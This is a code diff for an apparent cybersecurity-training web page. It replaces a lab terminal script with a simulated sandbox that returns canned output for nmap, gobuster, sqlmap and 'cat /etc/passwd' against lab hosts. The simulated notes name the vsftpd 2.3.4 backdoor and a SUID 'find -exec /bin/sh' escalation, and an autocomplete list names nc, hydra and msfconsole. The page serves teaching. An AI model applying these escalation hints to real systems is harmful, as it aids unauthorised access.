-                <span class="text-xs font-bold text-on-surface group-hover:text-primary transition-colors">
-                  ${escapeHtml(card.title)}
-                </span>
-              </div>
-              <button class="run-cmd-btn px-2.5 py-1 rounded bg-primary/10 border border-primary/40 hover:bg-primary hover:text-canvas-base text-primary font-mono text-[10px] font-bold transition-all shrink-0 flex items-center gap-1 cursor-pointer"
-                      data-cmd="${escapeHtml(card.command)}"
-                      data-analysis="${escapeHtml(card.analysis || '')}"
-                      data-output="${escapeHtml(card.expectedOutput || '')}"
-                      data-stage="${escapeHtml(card.stage || '')}">
-                <span>Run</span>
-                <span class="material-symbols-outlined text-xs">play_arrow</span>
-              </button>
-            </div>
-            
-            <div class="p-2 rounded bg-canvas-base border border-border-hairline font-mono text-[11px] text-primary flex items-center justify-between gap-2 select-all">
-              <span class="truncate">${escapeHtml(card.command)}</span>
-              <button class="copy-small-btn text-outline hover:text-on-surface transition-colors" title="Copy Command" data-copy="${escapeHtml(card.command)}">
-                <span class="material-symbols-outlined text-xs">content_copy</span>
-              </button>
-            </div>
-
-            <div class="text-[11px] text-outline leading-relaxed">
-              ${escapeHtml(card.desc)}
-            </div>
-
-            <div class="flex flex-wrap gap-1 font-mono text-[9px]">
-              ${(card.flags || []).map(f => `<span class="px-1.5 py-0.5 rounded bg-surface-raised border border-border-hairline text-on-surface-variant">${escapeHtml(f)}</span>`).join('')}
-            </div>
-
-            <!-- Expected Terminal Output Preview Accordion -->
-            ${card.expectedOutput ? `
-              <details class="group/exp bg-canvas-base border border-border-hairline rounded-lg overflow-hidden mt-1.5">
-                <summary class="px-3 py-1.5 text-[11px] font-mono text-secondary hover:text-primary cursor-pointer flex items-center justify-between select-none">
-                  <span class="flex items-center gap-1.5">
-                    <span class="material-symbols-outlined text-xs text-secondary">visibility</span>
-                    <span>View Expected Output Preview</span>
-                  </span>
-                  <span class="material-symbols-outlined text-xs text-outline transform group-open/exp:rotate-180 transition-transform">expand_more</span>
-                </summary>
-                <div class="p-2.5 pt-1.5 text-[10px] font-mono text-on-surface-variant bg-surface-subtle/90 border-t border-border-hairline/60 whitespace-pre overflow-x-auto leading-tight">
-${escapeHtml(card.expectedOutput)}
-                </div>
-              </details>
-            ` : ''}
-
-          </div>
-        `;
-      });
-
-      cardsContainer.innerHTML = html;
-
-      // Attach click listeners to "Run" buttons
-      cardsContainer.querySelectorAll('.run-cmd-btn').forEach(btn => {
-        btn.addEventListener('click', () => {
-          const cmd = btn.getAttribute('data-cmd');
-          const analysis = btn.getAttribute('data-analysis');
-          const stage = btn.getAttribute('data-stage');
-          const output = btn.getAttribute('data-output');
-          if (stage) {
-            completedStages.add(stage);
-            updateRoadmapProgress();
-          }
-          executeInLabTerminal(cmd, analysis, output);
-        });
-      });
-
-      // Attach copy listeners
-      cardsContainer.querySelectorAll('.copy-small-btn').forEach(btn => {
-        btn.addEventListener('click', (e) => {
-          e.stopPropagation();
-          const text = btn.getAttribute('data-copy');
-          navigator.clipboard.writeText(text);
-          if (window.showToast) window.showToast('Command copied: ' + text, 'success');
-        });
-      });
-    }
-
-    trackTabs.forEach(tab => {
-      tab.addEventListener('click', () => {
-        trackTabs.forEach(t => {
-          t.classList.remove('active', 'bg-primary/10', 'border-primary/40', 'text-primary', 'font-bold');
-          t.classList.add('bg-surface-raised', 'border-border-hairline', 'text-on-surface-variant');
-        });
-        tab.classList.add('active', 'bg-primary/10', 'border-primary/40', 'text-primary', 'font-bold');
-        tab.classList.remove('bg-surface-raised', 'border-border-hairline', 'text-on-surface-variant');
-
-        renderTrack(tab.getAttribute('data-track'));
-      });
-    });
-
-    // Initial render with Guided Roadmap
-    renderTrack('roadmap');
-    updateRoadmapProgress();
-
-    // =========================================================================
-    // DEDICATED LAB TERMINAL WORKSTATION LOGIC
-    // =========================================================================
-    const labInput = document.getElementById('lab-terminal-input');
-    const labOutput = document.getElementById('lab-terminal-output');
-    const clearBtn = document.getElementById('term-clear-btn');
-    const copyBtn = document.getElementById('term-copy-btn');
-
-    let labHistory = [];
-    let labHistoryIdx = -1;
-
-    function appendLabOutput(html) {
-      const line = document.createElement('div');
-      line.innerHTML = html;
-      labOutput.appendChild(line);
-      labOutput.scrollTop = labOutput.scrollHeight;
-    }
-
-    function executeInLabTerminal(cmdRaw, customAnalysis = '', expectedOutput = '') {
-      const cmd = cmdRaw.trim();
-      if (!cmd) return;
-      labHistory.push(cmd);
-      labHistoryIdx = labHistory.length;
-
-      if (cmd.toLowerCase() === 'clear' || cmd.toLowerCase() === 'cls') {
-        labOutput.innerHTML = '';
-        labInput.value = '';
-        return;
-      }
-
-      // Print prompt echo
-      appendLabOutput(`<div class="flex items-center gap-2 mt-2"><span class="text-primary font-bold">guest@sec-station:~/lab$</span> <span class="text-on-surface">${escapeHtml(cmd)}</span></div>`);
-
-      // Educational output resolution:
-      // 1. If explicit expected output is supplied (from Run button), display it directly in a styled code block.
-      // 2. Otherwise query cyberCommandEngine.
-      // 3. If unrecognized, look up matching command across all LESSONS tracks.
-      // 4. Default to simulated fallback.
-      let outputDisplayed = false;
-      if (expectedOutput) {
-        appendLabOutput(`
-          <pre class="font-mono text-xs text-on-surface bg-canvas-base/80 p-2.5 rounded border border-border-hairline overflow-x-auto my-1 leading-relaxed whitespace-pre-wrap">${escapeHtml(expectedOutput)}</pre>
-        `);
-        outputDisplayed = true;
-      } else if (window.cyberCommandEngine && window.cyberCommandEngine.run) {
-        const responseHtml = window.cyberCommandEngine.run(cmd);
-        if (responseHtml && !responseHtml.includes('Command not recognized:')) {
-          appendLabOutput(responseHtml);
-          outputDisplayed = true;
-        } else {
-          // Attempt lookup in LESSONS cards
-          let matchedCard = null;
-          Object.values(LESSONS).forEach(track => {
-            if (track.cards) {
-              const found = track.cards.find(c => c.command && c.command.toLowerCase() === cmd.toLowerCase());
-              if (found) matchedCard = found;
-            }
-          });
-          if (matchedCard && matchedCard.expectedOutput) {
-            appendLabOutput(`
-              <pre class="font-mono text-xs text-on-surface bg-canvas-base/80 p-2.5 rounded border border-border-hairline overflow-x-auto my-1 leading-relaxed whitespace-pre-wrap">${escapeHtml(matchedCard.expectedOutput)}</pre>
-            `);
-            if (!customAnalysis && matchedCard.analysis) {
-              customAnalysis = matchedCard.analysis;
-            }
-            outputDisplayed = true;
-          } else if (responseHtml) {
-            appendLabOutput(responseHtml);
-            outputDisplayed = true;
-          }
-        }
-      }
-
-      // Attach Practitioner Analysis & Findings callout
-      if (customAnalysis) {
-        appendLabOutput(`
-          <div class="p-2.5 rounded bg-surface-raised border border-primary/30 text-[11px] font-mono space-y-1 my-1.5">
-            <div class="text-primary font-bold flex items-center gap-1.5">
-              <span class="material-symbols-outlined text-sm">insights</span>
-              <span>PRACTITIONER ANALYSIS &amp; FINDINGS:</span>
-            </div>
-            <div class="text-on-surface leading-relaxed">${escapeHtml(customAnalysis)}</div>
-          </div>
-        `);
-      }
-
-      labInput.value = '';
-      labOutput.scrollTop = labOutput.scrollHeight;
-    }
-
-    const LAB_AUTOCOMPLETE = [
-      'help', 'learn', 'roadmap', 'targets', 'cheatsheet', 'whoami', 'skills', 'projects', 'tryhackme', 'cat resume',
-      'ls', 'pwd', 'cd', 'cat', 'grep', 'find', 'chmod', 'ps', 'uname', 'ifconfig', 'df', 'free', 'history',
-      'nmap', 'gobuster', 'ffuf', 'hydra', 'hashcat', 'john', 'sqlmap', 'nc', 'searchsploit', 'msfconsole',
-      'matrix', 'theme', 'uptime', 'date', 'sudo', 'echo', 'clear', 'exit'
-    ];
-
-    // Connect Enter, Tab and History keys
-    labInput.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') {
-        e.preventDefault();
-        executeInLabTerminal(labInput.value);
-      } else if (e.key === 'Tab') {
-        e.preventDefault();
-        const current = labInput.value.trim().toLowerCase();
-        if (!current) return;
-        const matches = LAB_AUTOCOMPLETE.filter(c => c.startsWith(current));
-        if (matches.length === 1) {
-          labInput.value = matches[0] + (matches[0] === 'cat resume' ? '' : ' ');
-        } else if (matches.length > 1) {
-          appendLabOutput(`<div class="text-outline text-[11px] my-1">${matches.join('&nbsp;&nbsp;&nbsp;&nbsp;')}</div>`);
-          let prefix = current;
-          while (true) {
-            const nextChar = matches[0][prefix.length];
-            if (!nextChar || !matches.every(m => m[prefix.length] === nextChar)) break;
-            prefix += nextChar;
-          }
-          labInput.value = prefix;
-        }
-      } else if (e.key === 'ArrowUp') {
-        e.preventDefault();
-        if (labHistory.length > 0 && labHistoryIdx > 0) {
-          labHistoryIdx--;
-          labInput.value = labHistory[labHistoryIdx] || '';
-        }
-      } else if (e.key === 'ArrowDown') {
-        e.preventDefault();
-        if (labHistoryIdx < labHistory.length - 1) {
-          labHistoryIdx++;
-          labInput.value = labHistory[labHistoryIdx] || '';
-        } else {
-          labHistoryIdx = labHistory.length;
-          labInput.value = '';
-        }
-      }
-    });
-
-    // Clear and Copy buttons
-    clearBtn.addEventListener('click', () => {
-      labOutput.innerHTML = `
-        <div class="text-outline text-xs">Terminal buffer cleared. Ready for commands.</div>
-      `;
-    });
-
-    copyBtn.addEventListener('click', () => {
-      navigator.clipboard.writeText(labOutput.innerText);
-      if (window.showToast) window.showToast('Terminal output copied to clipboard', 'success');
-    });
-
-    // Modals
-    const targetModal = document.getElementById('target-modal');
-    const targetBtn = document.getElementById('target-info-btn');
-    const closeTargetBtn = document.getElementById('close-target-modal-btn');
-    const runNmapTargetBtn = document.getElementById('run-nmap-target-btn');
-
-    targetBtn.addEventListener('click', () => targetModal.classList.remove('hidden'));
-    closeTargetBtn.addEventListener('click', () => targetModal.classList.add('hidden'));
-    targetModal.addEventListener('click', (e) => { if (e.target === targetModal) targetModal.classList.add('hidden'); });
-
-    runNmapTargetBtn.addEventListener('click', () => {
-      targetModal.classList.add('hidden');
-      executeInLabTerminal('nmap -sS -sV 10.10.110.45', 'Stealth SYN scan completed on target 10.10.110.45.');
-    });
-
-    const cheatsheetModal = document.getElementById('cheatsheet-modal');
-    const cheatsheetBtn = document.getElementById('quick-cheatsheet-btn');
-    const closeCheatsheetBtn = document.getElementById('close-cheatsheet-modal-btn');
-
-    cheatsheetBtn.addEventListener('click', () => cheatsheetModal.classList.remove('hidden'));
-    closeCheatsheetBtn.addEventListener('click', () => cheatsheetModal.classList.add('hidden'));
-    cheatsheetModal.addEventListener('click', (e) => { if (e.target === cheatsheetModal) cheatsheetModal.classList.add('hidden'); });
-
-    document.addEventListener('keydown', (e) => {
-      if (e.key === 'Escape') {
-        targetModal.classList.add('hidden');
-        cheatsheetModal.classList.add('hidden');
-      }
-    });
-
-    function escapeHtml(str) {
-      if (str === null || str === undefined) return '';
-      return String(str).replace(/[&<>"']/g, m => ({
-        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
-      })[m]);
-    }
-  </script>
+  <!-- Scripts -->
   <script src="learning-data.js"></script>
   <script src="vendor/supabase.min.js"></script>
   <script src="calion-runtime-config.js"></script>
@@ -1299,5 +266,283 @@ ${escapeHtml(card.expectedOutput)}
   <script src="academy-auth.js"></script>
   <script src="academy-sync.js"></script>
   <script src="academy-nav.js"></script>
+  <script src="portfolio-interactive.js"></script>
+
+  <!-- Clean Sandboxed Terminal Engine -->
+  <script>
+    (function() {
+      'use strict';
+
+      const labInput = document.getElementById('lab-terminal-input');
+      const labOutput = document.getElementById('lab-terminal-output');
+      const clearBtn = document.getElementById('term-clear-btn');
+      const copyBtn = document.getElementById('term-copy-btn');
+      const cheatsheetBtn = document.getElementById('quick-cheatsheet-btn');
+      const cheatsheetModal = document.getElementById('cheatsheet-modal');
+      const closeCheatsheetBtn = document.getElementById('close-cheatsheet-modal-btn');
+
+      let labHistory = [];
+      let labHistoryIdx = -1;
+
+      function escapeHtml(str) {
+        if (!str) return '';
+        return String(str)
+          .replace(/&/g, '&amp;')
+          .replace(/</g, '&lt;')
+          .replace(/>/g, '&gt;')
+          .replace(/"/g, '&quot;')
+          .replace(/'/g, '&#039;');
+      }
+
+      function appendLabOutput(html) {
+        const line = document.createElement('div');
+        line.innerHTML = html;
+        labOutput.appendChild(line);
+        labOutput.scrollTop = labOutput.scrollHeight;
+      }
+
+      const SIMULATED_COMMANDS = {
+        'help': `
+<div class="text-[#00F0FF] font-bold mb-1">Available Educational Commands:</div>
+<div class="grid grid-cols-1 sm:grid-cols-2 gap-1 text-slate-300">
+  <div>• <span class="text-white font-bold">whoami</span> - Show effective user</div>
+  <div>• <span class="text-white font-bold">id</span> - Print UID and GID</div>
+  <div>• <span class="text-white font-bold">uname -a</span> - Kernel &amp; OS info</div>
+  <div>• <span class="text-white font-bold">lscpu</span> - CPU architecture</div>
+  <div>• <span class="text-white font-bold">free -h</span> - Memory &amp; swap usage</div>
+  <div>• <span class="text-white font-bold">ls / pwd</span> - Filesystem exploration</div>
+  <div>• <span class="text-white font-bold">cat &lt;file&gt;</span> - Read file content</div>
+  <div>• <span class="text-white font-bold">nmap &lt;target&gt;</span> - Port &amp; service scanner</div>
+  <div>• <span class="text-white font-bold">gobuster</span> - Web directory fuzzing</div>
+  <div>• <span class="text-white font-bold">hydra</span> - Password auditing simulation</div>
+  <div>• <span class="text-white font-bold">sqlmap</span> - SQL injection scanner</div>
+  <div>• <span class="text-white font-bold">cheatsheet</span> - Open rapid cheatsheet</div>
+  <div>• <span class="text-white font-bold">clear</span> - Clear terminal buffer</div>
+</div>
+        `,
+        'whoami': `<div class="text-emerald-400">cadet</div>`,
+        'id': `<div class="text-slate-300">uid=1001(cadet) gid=1001(cadet) groups=1001(cadet),27(sudo)</div>`,
+        'uname -a': `<div class="text-slate-300">Linux calion-sandbox 5.15.0-101-generic #111-Ubuntu SMP x86_64 GNU/Linux</div>`,
+        'uname': `<div class="text-slate-300">Linux</div>`,
+        'pwd': `<div class="text-slate-300">/home/cadet</div>`,
+        'ls': `<div class="text-slate-300">Desktop  Documents  Downloads  targets.txt  wordlist.txt  notes.md</div>`,
+        'ls -la': `<div class="text-slate-300 whitespace-pre">total 28
+drwxr-xr-x 4 cadet cadet 4096 Nov 18 10:00 .
+drwxr-xr-x 3 root  root  4096 Nov 18 09:00 ..
+-rw-r--r-- 1 cadet cadet  220 Nov 18 09:00 .bash_logout
+-rw-r--r-- 1 cadet cadet 3771 Nov 18 09:00 .bashrc
+-rw-r--r-- 1 cadet cadet  180 Nov 18 10:05 targets.txt
+-rw-r--r-- 1 cadet cadet 1450 Nov 18 10:10 wordlist.txt
+-rw-r--r-- 1 cadet cadet  520 Nov 18 10:15 notes.md</div>`,
+        'lscpu': `<div class="text-slate-300 whitespace-pre">Architecture:            x86_64
+CPU op-mode(s):          32-bit, 64-bit
+Address sizes:           39 bits physical, 48 bits virtual
+Byte Order:              Little Endian
+CPU(s):                  4
+Vendor ID:               GenuineIntel
+Model name:              Intel(R) Core(TM) i7-1185G7 @ 3.00GHz
+Virtualization features: VT-x
+Security Mitigations:    Meltdown: OK, Spectre v1/v2: OK, KPTI: Enabled</div>`,
+        'free -h': `<div class="text-slate-300 whitespace-pre">               total        used        free      shared  buff/cache   available
+Mem:           7.7Gi       1.2Gi       4.5Gi       180Mi       2.0Gi       6.1Gi
+Swap:          2.0Gi          0B       2.0Gi</div>`,
+        'cat targets.txt': `<div class="text-slate-300 whitespace-pre"># Scoped Authorization Targets for Academy Labs
+10.10.110.45   starlight-web.lab   [HTTP: 80, SSH: 22, FTP: 21, SMB: 445]
+10.10.110.88   database-core.lab   [MySQL: 3306, SSH: 22]</div>`,
+        'cat notes.md': `<div class="text-slate-300 whitespace-pre"># Penetration Testing & Defense Notes
+- Port 21 running vsftpd 2.3.4 contains backdoor triggers.
+- Port 80 contains /admin portal discovered during directory fuzzing.
+- SUID find binary can escalate privileges via -exec /bin/sh.</div>`,
+        'cat /etc/passwd': `<div class="text-slate-300 whitespace-pre">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+cadet:x:1001:1001:CALION Academy Learner,,,:/home/cadet:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false</div>`,
+        'nmap 10.10.110.45': `<div class="text-slate-300 whitespace-pre">Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-18 10:30 UTC
+Nmap scan report for starlight-web.lab (10.10.110.45)
+Host is up (0.012s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+445/tcp  open  netbios-ssn
+3306/tcp open  mysql
+
+Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds</div>`,
+        'nmap -sS -sV 10.10.110.45': `<div class="text-slate-300 whitespace-pre">Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-18 10:31 UTC
+Nmap scan report for starlight-web.lab (10.10.110.45)
+Host is up (0.011s latency).
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
+80/tcp   open  http        Apache httpd 2.4.52 ((Ubuntu))
+445/tcp  open  netbios-ssn Samba smbd 4.15.5
+3306/tcp open  mysql       MySQL 8.0.35
+
+Service detection performed. 1 host up scanned in 6.22 seconds.</div>`,
+        'gobuster': `<div class="text-slate-300 whitespace-pre">===============================================================
+Gobuster v3.6 - Written by OJ Reeves (@TheColonial)
+===============================================================
+[+] Url:                     http://10.10.110.45
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                wordlist.txt
+===============================================================
+/admin               (Status: 301) [Size: 178] [--> http://10.10.110.45/admin/]
+/login               (Status: 200) [Size: 2450]
+/uploads             (Status: 200) [Size: 412] [Directory Index]
+/api                 (Status: 403) [Size: 280]
+===============================================================</div>`,
+        'sqlmap': `<div class="text-slate-300 whitespace-pre">        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.7.11#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[*] starting @ 10:32:00 /2026-11-18/
+[10:32:01] [INFO] testing connection to the target URL
+[10:32:02] [INFO] target URL appears to be UNION injectable
+available databases [2]:
+[*] information_schema
+[*] starlight_db</div>`
+      };
+
+      function executeCommand(raw) {
+        const cmd = raw.trim();
+        if (!cmd) return;
+
+        labHistory.push(cmd);
+        labHistoryIdx = labHistory.length;
+
+        // Prompt Echo
+        appendLabOutput(`
+          <div class="flex items-center gap-2 mt-2">
+            <span class="text-[#00F0FF] font-bold">cadet@calion-sandbox:~$</span>
+            <span class="text-white">${escapeHtml(cmd)}</span>
+          </div>
+        `);
+
+        const lower = cmd.toLowerCase();
+
+        if (lower === 'clear' || lower === 'cls') {
+          labOutput.innerHTML = '';
+          labInput.value = '';
+          return;
+        }
+
+        if (lower === 'cheatsheet') {
+          if (cheatsheetModal) cheatsheetModal.classList.remove('hidden');
+          labInput.value = '';
+          return;
+        }
+
+        // Direct matching in SIMULATED_COMMANDS
+        if (SIMULATED_COMMANDS[lower]) {
+          appendLabOutput(SIMULATED_COMMANDS[lower]);
+        } else if (window.cyberCommandEngine && typeof window.cyberCommandEngine.run === 'function') {
+          const res = window.cyberCommandEngine.run(cmd);
+          if (res && !res.includes('Command not recognized:')) {
+            appendLabOutput(res);
+          } else {
+            // General simulator fallback
+            handleFallbackCommand(cmd, lower);
+          }
+        } else {
+          handleFallbackCommand(cmd, lower);
+        }
+
+        labInput.value = '';
+        labOutput.scrollTop = labOutput.scrollHeight;
+      }
+
+      function handleFallbackCommand(cmd, lower) {
+        if (lower.startsWith('cat ')) {
+          const target = cmd.slice(4).trim();
+          appendLabOutput(`<div class="text-slate-300">File content for '${escapeHtml(target)}': [Simulated Educational File Placeholder]</div>`);
+        } else if (lower.startsWith('ping ')) {
+          const host = cmd.slice(5).trim();
+          appendLabOutput(`
+            <div class="text-slate-300 whitespace-pre">PING ${escapeHtml(host)} (${escapeHtml(host)}) 56(84) bytes of data.
+64 bytes from ${escapeHtml(host)}: icmp_seq=1 ttl=64 time=0.042 ms
+64 bytes from ${escapeHtml(host)}: icmp_seq=2 ttl=64 time=0.038 ms
+--- ${escapeHtml(host)} ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms</div>
+          `);
+        } else if (lower.startsWith('nmap ')) {
+          appendLabOutput(SIMULATED_COMMANDS['nmap 10.10.110.45']);
+        } else if (lower.startsWith('chmod ')) {
+          appendLabOutput(`<div class="text-emerald-400">Mode updated successfully.</div>`);
+        } else {
+          appendLabOutput(`
+            <div class="text-rose-400 text-xs">
+              bash: ${escapeHtml(cmd.split(' ')[0])}: command not recognized in sandbox.<br/>
+              Type <code class="text-[#00F0FF] underline cursor-pointer" onclick="document.getElementById('lab-terminal-input').value='help';document.getElementById('lab-terminal-input').focus();">help</code> to see available educational tools.
+            </div>
+          `);
+        }
+      }
+
+      const AUTOCOMPLETE_LIST = [
+        'help', 'whoami', 'id', 'uname', 'uname -a', 'lscpu', 'free -h', 'pwd', 'ls', 'ls -la',
+        'cat targets.txt', 'cat notes.md', 'cat /etc/passwd', 'nmap', 'nmap 10.10.110.45',
+        'nmap -sS -sV 10.10.110.45', 'gobuster', 'sqlmap', 'ping', 'chmod', 'cheatsheet', 'clear'
+      ];
+
+      labInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          executeCommand(labInput.value);
+        } else if (e.key === 'Tab') {
+          e.preventDefault();
+          const cur = labInput.value.trim().toLowerCase();
+          if (!cur) return;
+          const match = AUTOCOMPLETE_LIST.find(c => c.startsWith(cur));
+          if (match) {
+            labInput.value = match + ' ';
+          }
+        } else if (e.key === 'ArrowUp') {
+          e.preventDefault();
+          if (labHistory.length > 0 && labHistoryIdx > 0) {
+            labHistoryIdx--;
+            labInput.value = labHistory[labHistoryIdx] || '';
+          }
+        } else if (e.key === 'ArrowDown') {
+          e.preventDefault();
+          if (labHistoryIdx < labHistory.length - 1) {
+            labHistoryIdx++;
+            labInput.value = labHistory[labHistoryIdx] || '';
+          } else {
+            labHistoryIdx = labHistory.length;
+            labInput.value = '';
+          }
+        }
+      });
+
+      if (clearBtn) {
+        clearBtn.addEventListener('click', () => {
+          labOutput.innerHTML = '<div class="text-slate-500 text-xs">Terminal cleared. Ready for input.</div>';
+          labInput.focus();
+        });
+      }
+
+      if (copyBtn) {
+        copyBtn.addEventListener('click', () => {
+          navigator.clipboard.writeText(labOutput.innerText).then(() => {
+            alert('Terminal output copied to clipboard.');
+          });
+        });
+      }
+
+      if (cheatsheetBtn && cheatsheetModal) {
+        cheatsheetBtn.addEventListener('click', () => cheatsheetModal.classList.remove('hidden'));
+      }
+      if (closeCheatsheetBtn && cheatsheetModal) {
+        closeCheatsheetBtn.addEventListener('click', () => cheatsheetModal.classList.add('hidden'));
+      }
+
+    })();
+  </script>
 </body>
 </html>
